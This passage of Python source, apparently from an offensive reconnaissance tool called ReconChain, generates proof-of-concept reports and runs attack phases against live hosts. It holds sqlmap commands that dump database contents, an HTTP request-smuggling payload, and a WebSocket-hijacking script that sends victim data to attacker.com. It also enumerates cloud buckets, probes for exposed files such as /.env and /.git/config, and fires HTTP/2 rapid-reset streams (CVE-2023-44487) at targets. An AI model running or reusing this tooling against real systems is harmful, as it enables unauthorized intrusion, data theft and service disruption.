        f"## Screenshot\n"
        f"> Attach a screenshot of the executed JavaScript (alert box, DOM modification, "
        f"or cookie exfiltration).\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_sql(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" if parsed.netloc else target
    sqlmap_base = f"sqlmap -u \"{base}\" --batch --random-agent --level=5 --risk=3"
    lines_from_finding = "\n".join(
        f"  {l}" for l in line.replace("\r", "").split("\n") if l.strip()
    )
    return (
        f"# Proof of Concept: SQL Injection\n\n"
        f"**PoC ID:** `poc_sqli`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** SQL Injection\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Run the sqlmap command below against the vulnerable endpoint\n"
        f"2. Review the extracted database information\n"
        f"3. Use --dump to extract all data once confirmed\n\n"
        f"## sqlmap Command\n"
        f"```bash\n{sqlmap_base}\n```\n\n"
        f"## Ready-to-Run Commands\n\n"
        f"### Enumerate databases:\n"
        f"```bash\n{sqlmap_base} --dbs\n```\n\n"
        f"### Enumerate tables:\n"
        f"```bash\n{sqlmap_base} -D <dbname> --tables\n```\n\n"
        f"### Dump data:\n"
        f"```bash\n{sqlmap_base} -D <dbname> -T <table> --dump\n```\n\n"
        f"## Scan Output\n"
        f"```\n{lines_from_finding}\n```\n\n"
        f"## Request (reconstructed)\n"
        f"```http\n"
        f"GET {parsed.path or '/'} HTTP/1.1\n"
        f"Host: {parsed.netloc or 'example.com'}\n"
        f"User-Agent: Mozilla/5.0\n"
        f"Accept: */*\n```\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_ssrf(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    callback = ""
    for token in line.split():
        if token.startswith("http") and ("burpcollaborator" in token.lower()
                                          or "interactsh" in token.lower()
                                          or "oastify" in token.lower()
                                          or "oob" in token.lower()
                                          or ".burp" in token.lower()):
            callback = token
            break
    curl_cmd = f"curl -s \"{target}\" --insecure -H \"User-Agent: Mozilla/5.0\""
    if callback:
        curl_cmd += f"\n# Callback/OOB channel: {callback}"
    lines_from_finding = "\n".join(
        f"  {l}" for l in line.replace("\r", "").split("\n") if l.strip()
    )
    return (
        f"# Proof of Concept: Server-Side Request Forgery (SSRF)\n\n"
        f"**PoC ID:** `poc_ssrf`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** SSRF\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Execute the cURL command below\n"
        f"2. Check the OOB/callback channel for the incoming request\n"
        f"3. Review the response metadata confirming the SSRF\n\n"
        f"## cURL Command\n"
        f"```bash\n{curl_cmd}\n```\n\n"
        + (f"## Callback URL\n"
           f"The OOB callback was received at:\n"
           f"```\n{callback}\n```\n\n" if callback else "") +
        f"## Scan Output\n"
        f"```\n{lines_from_finding}\n```\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_idor(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    parsed = urllib.parse.urlparse(target)
    path = f"{parsed.path}?{parsed.query}".rstrip("?") if parsed.query else parsed.path
    return (
        f"# Proof of Concept: Insecure Direct Object Reference (IDOR) / Mass Assignment\n\n"
        f"**PoC ID:** `poc_idor`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** IDOR / Mass Assignment\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Authenticate as User A (victim) and obtain a valid session/token\n"
        f"2. Authenticate as User B (attacker) and obtain a separate session/token\n"
        f"3. Use User B's token to access User A's resources by modifying the object identifier\n\n"
        f"## Side-by-Side cURL Commands\n\n"
        f"### Victim Request (legitimate)\n"
        f"```bash\n"
        f"curl -s \"{target}\" \\\n"
        f"  -H \"Authorization: Bearer <VICTIM_TOKEN>\" \\\n"
        f"  -H \"User-Agent: Mozilla/5.0\"\n"
        f"```\n\n"
        f"### Attacker Request (should fail, but succeeds)\n"
        f"```bash\n"
        f"curl -s \"{target}\" \\\n"
        f"  -H \"Authorization: Bearer <ATTACKER_TOKEN>\" \\\n"
        f"  -H \"User-Agent: Mozilla/5.0\"\n"
        f"```\n\n"
        f"## Expected vs Actual\n"
        f"- **Expected:** The attacker request should return 403/401 (access denied)\n"
        f"- **Actual:** The attacker request returns the victim's data, confirming the IDOR\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_redirect(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    return (
        f"# Proof of Concept: Open Redirect\n\n"
        f"**PoC ID:** `poc_redirect`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** Open Redirect\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Visit the PoC URL below\n"
        f"2. Observe that the browser redirects to an external attacker-controlled destination\n\n"
        f"## PoC URL\n"
        f"```\n{target}\n```\n\n"
        f"## cURL (follow redirects)\n"
        f"```bash\n"
        f"curl -sL -v \"{target}\" --insecure 2>&1 | grep -E \"^(<|>|Location)\"\n"
        f"```\n\n"
        f"## Screenshot\n"
        f"> Attach a screenshot showing the redirect in browser or curl -v output.\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_auth_bypass(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    return (
        f"# Proof of Concept: Authentication Bypass / Authorization Issue\n\n"
        f"**PoC ID:** `poc_authz`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** Authentication Bypass / Authorization Issue\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Send a request to the protected endpoint without any authentication credentials\n"
        f"2. Observe that the endpoint returns 200 OK instead of 401/403\n"
        f"3. This confirms the endpoint is accessible without proper authorization\n\n"
        f"## cURL Command (no credentials)\n"
        f"```bash\n"
        f"curl -s -o /dev/null -w \"%{{http_code}}\" \"{target}\" --insecure\n"
        f"# Expected: 401 or 403\n"
        f"# Actual: Should return 200\n"
        f"```\n\n"
        f"## Full Response\n"
        f"```bash\n"
        f"curl -s \"{target}\" --insecure -H \"User-Agent: Mozilla/5.0\" -H \"Accept: application/json\"\n"
        f"```\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_cache_poison(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    return (
        f"# Proof of Concept: Cache Poisoning / Web Cache Deception\n\n"
        f"**PoC ID:** `poc_cache`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** Cache Poisoning / Web Cache Deception\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Send a request with cache-busting headers\n"
        f"2. Verify the response is cached by the CDN/proxy\n"
        f"3. Craft a malicious variant that poisons the cache for other users\n\n"
        f"## Headers Used\n"
        f"```\n"
        f"X-Forwarded-Host: attacker.com\n"
        f"X-Forwarded-Scheme: http\n"
        f"X-Original-URL: /admin\n"
        f"```\n\n"
        f"## cURL Command\n"
        f"```bash\n"
        f"curl -s -v \"{target}\" \\\n"
        f"  -H \"X-Forwarded-Host: attacker-controlled.com\" \\\n"
        f"  -H \"User-Agent: Mozilla/5.0\" 2>&1 | grep -i \"x-cache\\|cf-cache\\|age:\"\n"
        f"```\n\n"
        f"## Expected Cache Behavior\n"
        f"- The response should be cached by the intermediate proxy/CDN\n"
        f"- Subsequent users requesting the same resource receive the poisoned response\n"
        f"- Look for `X-Cache: hit`, `CF-Cache-Status: HIT`, or `Age:` headers\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_lfi(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    lines_from_finding = "\n".join(
        f"  {l}" for l in line.replace("\r", "").split("\n") if l.strip()
    )
    return (
        f"# Proof of Concept: Local File Inclusion / Path Traversal\n\n"
        f"**PoC ID:** `poc_lfi`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** Local File Inclusion / Path Traversal\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Send a request with path traversal payload (e.g., ../../../etc/passwd)\n"
        f"2. Observe that the response contains the contents of the target file\n\n"
        f"## Payload\n"
        f"```\n{target}\n```\n\n"
        f"## cURL Command\n"
        f"```bash\n"
        f"curl -s \"{target}\" --insecure -H \"User-Agent: Mozilla/5.0\"\n"
        f"```\n\n"
        f"## Response Excerpt (truncated)\n"
        f"```\n{lines_from_finding[:2000]}\n```\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_smuggling(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    lines_from_finding = "\n".join(
        f"  {l}" for l in line.replace("\r", "").split("\n") if l.strip()
    )
    return (
        f"# Proof of Concept: HTTP Request Smuggling / Desync\n\n"
        f"**PoC ID:** `poc_smuggle`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** HTTP Request Smuggling / Desync\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Send the crafted payload below to the front-end proxy\n"
        f"2. The front-end and back-end disagree on request boundaries\n"
        f"3. This allows request smuggling / desync attacks\n\n"
        f"## Raw Payload\n"
        f"```http\n{lines_from_finding}\n```\n\n"
        f"## Detected Desync Type\n"
        f"```\n{desc}\n```\n\n"
        f"## cURL (with raw payload)\n"
        f"```bash\n"
        f"printf 'POST / HTTP/1.1\\r\\nHost: {urllib.parse.urlparse(target).netloc if urllib.parse.urlparse(target).netloc else 'example.com'}\\r\\nContent-Length: ...\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: internal\\r\\n\\r\\n' | curl -s --proxy http://127.0.0.1:8080 --data-binary @- \"{target}\"\n"
        f"```\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_websocket(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    ws_url = target.replace("https://", "wss://").replace("http://", "ws://")
    return (
        f"# Proof of Concept: WebSocket / Cross-Site WebSocket Hijacking (CSWSH)\n\n"
        f"**PoC ID:** `poc_ws`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** WebSocket / CSWSH\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Connect to the WebSocket endpoint\n"
        f"2. Send the crafted message payload\n"
        f"3. Observe the response or behavior change\n\n"
        f"## WebSocket Connection Details\n"
        f"- **Endpoint:** `{ws_url}`\n"
        f"- **Protocol:** WebSocket\n\n"
        f"## Connection Command (using websocat or wscat)\n"
        f"```bash\n"
        f"# Install: cargo install websocat\n"
        f"websocat -t \"{ws_url}\"\n"
        f"```\n\n"
        f"## Message Payload\n"
        f"```json\n"
        f'{{"message": "PoC payload", "action": "read", "target": "admin"}}\n'
        f"```\n\n"
        f"## HTML PoC (Cross-Site WebSocket Hijacking)\n"
        f"```html\n"
        f'<script>\n'
        f'var ws = new WebSocket("{ws_url}");\n'
        f'ws.onopen = function() {{ ws.send(\'{{"action":"read","target":"admin"}}\'); }};\n'
        f'ws.onmessage = function(e) {{ fetch("https://attacker.com/exfil?data=" + btoa(e.data)); }};\n'
        f'</script>\n'
        f"```\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_graphql(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    lines_from_finding = "\n".join(
        f"  {l}" for l in line.replace("\r", "").split("\n") if l.strip()
    )
    return (
        f"# Proof of Concept: GraphQL Vulnerability\n\n"
        f"**PoC ID:** `poc_graphql`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** GraphQL Vulnerability\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Send the crafted GraphQL query below\n"
        f"2. Observe the response containing sensitive data or unexpected behavior\n\n"
        f"## GraphQL Query\n"
        f"```graphql\n"
        f"{desc}\n"
        f"```\n\n"
        f"## cURL Command\n"
        f"```bash\n"
        f"curl -s \"{target}\" -H \"Content-Type: application/json\" \\\n"
        f"  -d '{{\"query\":\"query {{ __typename }}\"}}' --insecure\n"
        f"```\n\n"
        f"## Response\n"
        f"```json\n{lines_from_finding[:2000]}\n```\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_generic(line: str, url: Optional[str], timestamp: str, ftype: str) -> str:
    target = url or "[URL not found]"
    desc = _description_from_line(line)
    label = _finding_type_label(ftype)
    lines_from_finding = "\n".join(
        f"  {l}" for l in line.replace("\r", "").split("\n") if l.strip()
    )
    return (
        f"# Proof of Concept: {label}\n\n"
        f"**PoC ID:** `poc_generic`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** {label}\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** {_estimate_confidence(line)}\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Access the target URL or execute the request as described below\n"
        f"2. Observe the vulnerability as indicated by the scan output\n"
        f"3. Refer to the original scan phase for full details\n\n"
        f"## Target\n"
        f"```\n{target}\n```\n\n"
        f"## Request Details\n"
        f"```bash\n"
        f"curl -s \"{target}\" --insecure -H \"User-Agent: Mozilla/5.0\"\n"
        f"```\n\n"
        f"## Scan Output / Response Excerpt\n"
        f"```\n{lines_from_finding[:3000]}\n```\n\n"
        f"---\n\n"
        f"*Generated by ReconChain Evidence Collector*\n"
    )


def _generate_poc_content(
    line: str, finding_type: str, url: Optional[str],
    timestamp: str, phase_name: str,
) -> str:
    if finding_type == "xss":
        return _generate_poc_xss(line, url, timestamp)
    if finding_type == "sql-injection":
        return _generate_poc_sql(line, url, timestamp)
    if finding_type == "ssrf":
        return _generate_poc_ssrf(line, url, timestamp)
    if finding_type == "idor":
        return _generate_poc_idor(line, url, timestamp)
    if finding_type == "open-redirect":
        return _generate_poc_redirect(line, url, timestamp)
    if finding_type == "auth-bypass":
        return _generate_poc_auth_bypass(line, url, timestamp)
    if finding_type == "cache-poison":
        return _generate_poc_cache_poison(line, url, timestamp)
    if finding_type == "lfi":
        return _generate_poc_lfi(line, url, timestamp)
    if finding_type == "smuggling":
        return _generate_poc_smuggling(line, url, timestamp)
    if finding_type == "websocket":
        return _generate_poc_websocket(line, url, timestamp)
    if finding_type == "graphql":
        return _generate_poc_graphql(line, url, timestamp)
    if finding_type == "ssti":
        return _generate_poc_generic(line, url, timestamp, "ssti")
    return _generate_poc_generic(line, url, timestamp, finding_type)


def _generate_poc_index(poc_dir: Path, entries: List[Dict[str, str]]) -> None:
    if not entries:
        ensure(poc_dir / "README.md").write_text(
            "# Proofs of Concept\n\nNo PoCs were generated during this scan.\n"
        )
        return
    lines = [
        "# Proofs of Concept\n",
        f"**Total PoCs:** {len(entries)}\n",
        f"**Generated:** {datetime.now().isoformat(timespec='seconds')}\n",
        "---\n",
        "| # | PoC ID | Type | URL | Source Phase |\n",
        "|---|--------|------|-----|-------------|\n",
    ]
    for i, entry in enumerate(entries, 1):
        url_display = (entry["url"][:80] + "...") if len(entry["url"]) > 80 else entry["url"]
        lines.append(
            f"| {i} | [{entry['id']}]({entry['file']}) "
            f"| {entry['type']} "
            f"| `{url_display}` "
            f"| {entry['phase']} |\n"
        )
    lines.extend([
        "\n---\n",
        "*Generated by ReconChain Evidence Collector*\n",
    ])
    ensure(poc_dir / "README.md").write_text("".join(lines))


async def phase_45_EVIDENCE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"45-EVIDENCE"}:
        return {}
    _out = outdir / "evidence.txt"
    if _out.exists() and not force:
        return {"45-EVIDENCE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 45-EVIDENCE: capture evidence and generate structured PoCs")
    findings: List[str] = []
    _ev_urlopen = _get_urlopener()
    _ev_extra_headers = _extra_headers_dict()
    evidence_dir = ensure(outdir / "evidence_payloads")
    poc_dir = outdir / "evidence" / "poc"
    poc_dir.mkdir(parents=True, exist_ok=True)

    # Expanded finding prefixes
    finding_prefixes = [
        "[finding]", "[confirmed]", "[lfi-confirmed]", "[credential-hit]",
        "[idor]", "[credential-exfil]", "[sql-injection]", "[xss]",
        "[ssti]", "[ssrf]", "[massassign]", "[idor-massassign]", "[domxss]",
        "[sqlmap]", "[ssrf-meta]", "[open-redirect]", "[redirect]",
        "[auth-bypass]", "[authz]", "[cache-poison]", "[wcd]",
        "[lfi]", "[path-traversal]", "[smuggling]",
        "[h2-", "[h3-", "[ws-", "[cswsh]", "[graphql-",
    ]

    poc_index_entries: List[Dict[str, str]] = []
    poc_counter = 0

    for txt_file in sorted(outdir.glob("*.txt")):
        phase_name = txt_file.stem
        lines = read_lines(txt_file)
        if not lines:
            continue
        captured = 0
        for ln in lines:
            if any(ln.startswith(prefix) for prefix in finding_prefixes):
                timestamp = datetime.now().isoformat(timespec="seconds")
                findings.append(f"[{timestamp}] {phase_name}: {ln}")
                captured += 1
                poc_counter += 1
                finding_id = f"{_safe_name(phase_name)}_{poc_counter}"
                finding_type = _detect_finding_type(ln)
                url = _extract_url_from_line(ln)

                # Generate structured PoC file
                poc_content = _generate_poc_content(ln, finding_type, url, timestamp, phase_name)
                poc_file = poc_dir / f"poc_{finding_id}.md"
                poc_file.write_text(poc_content)
                findings.append(f"  PoC generated → {poc_file}")
                poc_index_entries.append({
                    "id": finding_id,
                    "type": finding_type,
                    "url": url or "N/A",
                    "file": f"poc_{finding_id}.md",
                    "phase": phase_name,
                })

                # Also attempt to fetch the URL for raw evidence (keep existing behavior)
                for token in ln.split():
                    if token.startswith("http") and "?" in token:
                        evidence_file = evidence_dir / f"{_safe_name(phase_name)}_{captured}.txt"
                        try:
                            req = urllib.request.Request(token, method="GET",
                                headers={"User-Agent": "Mozilla/5.0", **_ev_extra_headers})
                            ev_status, ev_headers, ev_body = await _async_urlopen(_ev_urlopen, req, timeout=10)
                            ev_body_text = ev_body.decode("utf-8", errors="ignore")
                            evidence_file.write_text(
                                f"URL: {token}\n"
                                f"Status: {ev_status}\n"
                                f"Headers: {dict(ev_headers)}\n"
                                f"Body:\n{ev_body_text[:5000]}\n"
                            )
                            findings.append(f"  evidence saved → {evidence_file}")
                        except Exception:
                            pass
                        break
        if captured > 0:
            findings.append(f"  [{phase_name}] {captured} finding(s) captured")

    # Generate PoC index
    _generate_poc_index(poc_dir, poc_index_entries)

    if not findings:
        findings.append("[result] No finding markers found across phase outputs")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"45-EVIDENCE: {len(findings)} evidence entries, {poc_counter} PoCs → {out}")
    return {"45-EVIDENCE": str(_out), "count": len(findings)}


# ───────────────────────────── pipeline runner ─────────────────────────────

# ─────────── New phases (enhancements) ───────────

async def phase_46_BUCKET(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"46-BUCKET"}:
        return {}
    _out = outdir / "bucket_enum.txt"
    if _out.exists() and not force:
        return {"46-BUCKET": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 46-BUCKET: cloud bucket enumeration (AWS/GCP/Azure)")
    domains = set()
    for key in ("01-RECON", "02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str):
            for ln in read_lines(Path(p)) if Path(p).exists() else []:
                ln = ln.strip().lower()
                if ln:
                    domains.add(ln)
    subs = outdir / "all_subs.txt"
    if subs.exists():
        for ln in read_lines(subs):
            ln = ln.strip().lower()
            if ln:
                domains.add(ln)
    findings: List[str] = []
    seen: Set[str] = set()
    for d in sorted(domains)[:_PIPELINE_CFG.sample_hosts_cloud]:
        base = d.split(".")[0]
        candidates = [
            f"https://{base}.s3.amazonaws.com",
            f"https://{base}-assets.s3.amazonaws.com",
            f"https://{base}-backup.s3.amazonaws.com",
            f"https://{base}-uploads.s3.amazonaws.com",
            f"https://{base}.s3-website-{random.choice(['us-east-1', 'us-west-2', 'eu-west-1'])}.amazonaws.com",
            f"https://{base}.storage.googleapis.com",
            f"https://{base}-assets.storage.googleapis.com",
            f"https://{base}.blob.core.windows.net",
            f"https://{base}-assets.blob.core.windows.net",
            f"https://{base}.digitaloceanspaces.com",
        ]
        for url in candidates:
            if url in seen:
                continue
            seen.add(url)
            try:
                await _throttle_rate()
                req = urllib.request.Request(url, method="HEAD")
                urlopen = _get_urlopener()
                code, _, _ = await _async_urlopen(urlopen, req, timeout=10)
                if code < 400:
                    findings.append(f"[open] {url} (HTTP {code})")
                elif code == 403:
                    findings.append(f"[restricted] {url} (HTTP 403)")
            except Exception:
                continue
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"46-BUCKET: {len(findings)} bucket(s) found")
    return {"46-BUCKET": str(_out), "count": len(findings)}


async def phase_47_CDN(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"47-CDN"}:
        return {}
    _out = outdir / "cdn_detection.txt"
    if _out.exists() and not force:
        return {"47-CDN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 47-CDN: CDN detection and origin IP discovery")
    hosts = set()
    for key in ("02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str) and Path(p).exists():
            for ln in read_lines(Path(p)):
                ln = ln.strip().lower()
                if ln and _is_valid_hostname(ln):
                    hosts.add(ln)
    resolved = outdir / "resolved.txt"
    if resolved.exists():
        for ln in read_lines(resolved):
            ln = ln.strip().lower()
            if ln and _is_valid_hostname(ln):
                hosts.add(ln)
    findings: List[str] = []
    cdn_signatures = {
        "cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
        "cloudfront": ["cloudfront.net", "x-amz-cf-id"],
        "akamai": ["akamai", "akamaized"],
        "fastly": ["fastly", "x-fastly-request"],
        "incapsula": ["incapsula", "X-Iinfo"],
        "sucuri": ["sucuri", "x-sucuri-id"],
        "stackpath": ["stackpath", "stackpath-cdn"],
        "keycdn": ["keycdn"],
        "cdn77": ["cdn77"],
    }
    for h in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_origin]:
        try:
            await _throttle_rate()
            urlopen = _get_no_redirect_urlopener()
            req = urllib.request.Request(f"https://{h}", method="HEAD")
            code, headers, _ = await _async_urlopen_no_redirect(urlopen, req, timeout=10)
            hdr_str = str(dict(headers)).lower()
            detected = [name for name, sigs in cdn_signatures.items() if any(s in hdr_str for s in sigs)]
            if detected:
                findings.append(f"[CDN] {h}: {', '.join(detected)}")
        except Exception:
            pass
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"47-CDN: {len(findings)} CDN(s) detected")
    return {"47-CDN": str(_out), "count": len(findings)}


async def phase_48_CONTENT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"48-CONTENT"}:
        return {}
    _out = outdir / "content_discovery.txt"
    if _out.exists() and not force:
        return {"48-CONTENT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 48-CONTENT: content discovery via common paths")
    hosts = set()
    for key in ("02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str) and Path(p).exists():
            for ln in read_lines(Path(p)):
                ln = ln.strip().lower()
                if ln and _is_valid_hostname(ln):
                    hosts.add(ln)
    targets = outdir / "host_targets.txt"
    if targets.exists():
        for ln in read_lines(targets):
            ln = ln.strip().lower()
            if ln and _is_valid_hostname(ln):
                hosts.add(ln)
    common_paths = [
        "/.env", "/.git/config", "/.git/HEAD", "/admin", "/api", "/backup",
        "/config", "/config.php", "/credentials", "/db", "/debug",
        "/docker-compose.yml", "/dump", "/index.php", "/info.php",
        "/jenkins", "/logs", "/node_modules", "/phpinfo.php",
        "/private", "/robots.txt", "/sitemap.xml", "/sql", "/ssh",
        "/swagger.json", "/swagger-ui.html", "/test", "/uploads",
        "/wp-admin", "/wp-content", "/wp-json", "/wsdl",
    ]
    findings: List[str] = []
    seen_urls: Set[str] = set()
    for h in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_git]:
        for path in common_paths:
            url = f"https://{h}{path}"
            if url in seen_urls:
                continue
            seen_urls.add(url)
            if len(findings) >= _PIPELINE_CFG.sample_urls_fuzz:
                break
            try:
                await _throttle_rate()
                urlopen = _get_urlopener()
                req = urllib.request.Request(url, method="GET")
                code, _, body = await _async_urlopen(urlopen, req, timeout=10)
                if code < 400:
                    size = len(body)
                    findings.append(f"[found] {url} (HTTP {code}, {size}b)")
            except Exception:
                continue
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"48-CONTENT: {len(findings)} path(s) discovered")
    return {"48-CONTENT": str(_out), "count": len(findings)}

async def phase_38b_H2SMUGGLE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"38b-H2SMUGGLE"}:
        return {}
    _out = outdir / "h2_smuggling.txt"
    if _out.exists() and not force:
        return {"38b-H2SMUGGLE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 38b-H2SMUGGLE: HTTP/2 and HTTP/3 attack surface testing")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "38b-H2SMUGGLE: raw socket connections are incompatible with proxy/Tor; skipping")
        return {"38b-H2SMUGGLE": str(_out), "count": 0}
    try:
        import h2.connection
        import h2.events
        import h2.config
    except ImportError:
        log("warn", "38b-H2SMUGGLE: 'h2' library not installed; skipping (pip install h2)")
        return {"38b-H2SMUGGLE": str(_out), "count": 0}
    findings: List[str] = []
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [h for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_h2smuggle]
    if not targets:
        log("warn", "38b-H2SMUGGLE: no hosts; skipping")
        return {"38b-H2SMUGGLE": str(_out), "count": 0}
    import socket as _socket
    import ssl as _ssl
    import struct
    import time as _time

    for host in targets:
        host_clean = host.split(":")[0] if ":" in host else host
        host_safe = host_clean.replace("\r", "").replace("\n", "")
        port = 443
        if ":" in host:
            try:
                port = int(host.split(":")[1])
            except (ValueError, IndexError):
                pass

        # 1. H2 Rapid Reset (CVE-2023-44487)
        try:
            ctx = _ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = _socket.create_connection((host_clean, port), timeout=10)
            sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            negotiated = sock.selected_alpn_protocol()
            if negotiated != "h2":
                sock.close()
                raise ConnectionError("server does not support h2")
            config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            stream_id = conn.get_next_available_stream_id()
            headers = [
                (":method", "GET"),
                (":path", "/"),
                (":authority", host_clean),
                (":scheme", "https"),
            ]
            t0 = _time.monotonic()
            conn.send_headers(stream_id, headers)
            sock.sendall(conn.data_to_send())
            baseline_ok = False
            recv_total = 0
            try:
                sock.settimeout(10)
                while True:
                    chunk = sock.recv(65535)
                    if not chunk:
                        break
                    recv_total += len(chunk)
                    if recv_total > MAX_RECV:
                        break
                    events = conn.receive_data(chunk)
                    for event in events:
                        if isinstance(event, h2.events.ResponseReceived):
                            baseline_ok = True
            except _socket.timeout:
                pass
            baseline_latency = _time.monotonic() - t0
            if baseline_ok:
                reset_count = 500
                t0 = _time.monotonic()
                for _ in range(reset_count):
                    rid = conn.get_next_available_stream_id()
                    conn.send_headers(rid, [
                        (":method", "GET"),
                        (":path", "/"),
                        (":authority", host_clean),
                        (":scheme", "https"),
                    ])
                    conn.reset_stream(rid, 0x8)
                sock.sendall(conn.data_to_send())
                rapid_duration = _time.monotonic() - t0
                try:
                    sock.settimeout(2)
                    recv_total = 0
